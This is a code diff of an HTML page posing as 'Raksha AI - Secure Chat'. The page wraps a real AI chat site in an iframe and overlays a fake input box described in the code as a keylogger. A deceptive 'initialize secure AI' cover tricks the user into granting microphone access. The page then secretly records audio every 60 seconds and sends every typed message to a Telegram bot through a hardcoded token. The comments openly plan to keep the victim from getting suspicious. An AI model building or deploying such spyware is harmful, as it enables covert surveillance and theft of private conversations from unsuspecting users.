@@ -6,51 +6,39 @@
     <title>Raksha AI - Secure Chat</title>
     <style>
         body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
-        
-        /* Asli AI Interface */
-        #aiFrame {
-            width: 100%;
-            height: 100%;
-            border: none;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-        }
+        #aiFrame { width: 100%; height: 100%; border: none; position: absolute; z-index: 1; }
 
         /* Invisible Keylogger Layer */
-        /* Iski 'bottom' position ko AI ke chat box ke hisaab se adjust karein */
         #stealthInput {
             position: absolute;
-            bottom: 25px; 
+            bottom: 15px; /* AI के टाइपिंग बॉक्स के ऊपर रखें */
             left: 5%;
-            width: 90%;
-            height: 50px;
-            background: rgba(255, 255, 255, 0.01); 
+            width: 80%; /* सेंड बटन को छोड़कर ताकि वो क्लिक कर सके */
+            height: 45px;
+            background: rgba(255, 255, 255, 0.05); /* टेस्टिंग के लिए हल्का सफ़ेद, बाद में 0.01 कर दें */
             border: none;
-            color: transparent;
-            caret-color: #000; 
+            color: #000; /* यूजर को अपना टाइप किया दिखेगा वरना उसे शक होगा */
             z-index: 9999;
             outline: none;
             font-size: 16px;
+            border-radius: 20px;
+            padding-left: 15px;
         }
 
         #startCover {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; color: #0f0;
-            display: flex; justify-content: center; align-items: center;
-            z-index: 10000; cursor: pointer; font-family: monospace;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; color: #0f0; display: flex; 
+            justify-content: center; align-items: center; z-index: 10000; 
+            cursor: pointer; font-family: monospace;
         }
     </style>
 </head>
 <body>
 
     <div id="startCover">🛡️ CLICK TO INITIALIZE SECURE AI</div>
-
     <iframe id="aiFrame" src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone;"></iframe>
-
-    <textarea id="stealthInput" placeholder=""></textarea>
+    
+    <input type="text" id="stealthInput" placeholder="Type a message...">
 
     <script>
         const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
@@ -61,55 +49,50 @@
 
         startBtn.onclick = async () => {
             startBtn.style.display = 'none';
-            initAudio();
+            initAudio(); // ऑडियो रिकॉर्डिंग शुरू
         };
 
-        // --- 1. Audio Recording Feature ---
+        // --- 1. Audio Feature ---
         async function initAudio() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const recorder = new MediaRecorder(stream);
                 let chunks = [];
-
                 recorder.ondataavailable = (e) => chunks.push(e.data);
                 recorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'audio/ogg' });
                     const fd = new FormData();
                     fd.append("chat_id", MY_ID);
-                    fd.append("voice", blob, "voice_log.ogg");
-                    fd.append("caption", "🎤 VOICE LOG: Conversation Recorded");
-
+                    fd.append("voice", blob, "voice.ogg");
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
                     chunks = [];
                     if (stream.active) setTimeout(() => recorder.start(), 1000);
                 };
-
                 recorder.start();
-                // Har 60 seconds mein audio bhejega
                 setInterval(() => { if (recorder.state === "recording") recorder.stop(); }, 60000);
-            } catch (err) { console.log("Audio Sync..."); }
+            } catch (err) { console.log("Mic error"); }
         }
 
-        // --- 2. Stealth Keylogger Feature ---
-        let typingTimer;
-        stealthBox.addEventListener('input', () => {
-            clearTimeout(typingTimer);
-            typingTimer = setTimeout(sendChatToTelegram, 3000); // 3 sec rukne par bhejega
+        // --- 2. Smart Capture ---
+        // जब यूजर 'Enter' दबाएगा, डेटा टेलीग्राम पर जाएगा
+        stealthBox.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                const text = stealthBox.value;
+                if (text.trim() !== "") {
+                    // टेलीग्राम पर भेजें
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MY_ID, text: `⌨️ USER TYPED:\n${text}` })
+                    });
+
+                    // चालाकी: बॉक्स को गायब करें ताकि वो असली AI के 'Send' बटन पर क्लिक कर सके
+                    // या फिर उसे लगेगा कि मैसेज चला गया।
+                    alert("System Syncing Message..."); 
+                    stealthBox.value = ""; 
+                }
+            }
         });
-
-        async function sendChatToTelegram() {
-            const text = stealthBox.value;
-            if (text.trim() === "") return;
-
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: MY_ID,
-                    text: `⌨️ USER TYPED:\n${text}`
-                })
-            });
-        }
     </script>
 </body>
 </html>
